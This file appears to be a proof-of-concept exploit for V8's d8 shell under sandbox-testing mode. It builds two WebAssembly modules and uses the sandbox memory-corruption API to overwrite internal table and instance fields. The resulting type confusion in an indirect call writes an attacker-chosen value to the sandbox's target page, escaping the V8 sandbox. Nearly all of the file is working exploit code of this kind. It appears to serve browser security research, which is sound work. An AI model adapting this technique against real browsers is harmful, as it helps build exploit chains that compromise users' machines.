// Flags: --sandbox-testing --experimental-wasm-type-reflection

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");

// module 0
let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));

let $func0 = builder.addFunction("func0", $sig_v_ls)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);

let $t0 = builder
    .addTable(wasmRefType($sig_v_ls), 1, 10, [kExprRefFunc, $func0.index])
    .exportAs('table0');

let instance0 = builder.instantiate();
let { table0, func0 } = instance0.exports;

// module 1
builder = new WasmModuleBuilder();
let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []));

let $func1 = builder.addFunction("func1", $sig_v_ll).exportFunc()
    .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprReturn,
    ]);


let $boom = builder.addFunction("boom", $sig_v_ll)
  .exportFunc()
  .addBody([
      kExprLocalGet, 0,
    kExprLocalGet, 1,
    kExprI32Const, 0,
    kExprCallIndirect, $sig_v_ll, 0,
  ])
let $t1 = builder
  .addTable(wasmRefType($sig_v_ll), 1, 1, [kExprRefFunc, $func1.index])
  .exportAs('table1');

let instance1 = builder.instantiate();
let { table1, boom, func1 } = instance1.exports;

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmTableObjectTypeOffset = 28;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

const kRef = 9;
const kSmiTagSize = 1;
const kHeapTypeShift = 5;



let t0 = getPtr(table0);
let t1 = getPtr(table1);
let uses_t0 = getField(t0, 0x18);
let uses_t1 = getField(t1, 0x18);
setField(t0, 0x18, uses_t1); // table uses

let instance0_ptr = getPtr(instance0);
let module_object0 = getField(instance0_ptr, 0x10);

let instance1_ptr = getPtr(instance1);
let module_object1 = getField(instance1_ptr, 0x10);

setField(instance1_ptr, 0x10, module_object0);

// let instance0_ptr = getPtr(instance0);
// let instance1_ptr = getPtr(instance1);
// let trusted_data0_index = getField(instance0_ptr, 0xc);
// let trusted_data1_index = getField(instance1_ptr, 0xc);
// setField(instance0_ptr, 0xc, trusted_data1_index);


// %DebugPrint(table0);
// %DebugPrint(table1);
// %SystemBreak();



table0.grow(2, func0);

boom(BigInt(Sandbox.targetPage) - 0x7n, 0xdeadbeefcafebaben);
// console.log(boom(1n, 2n));
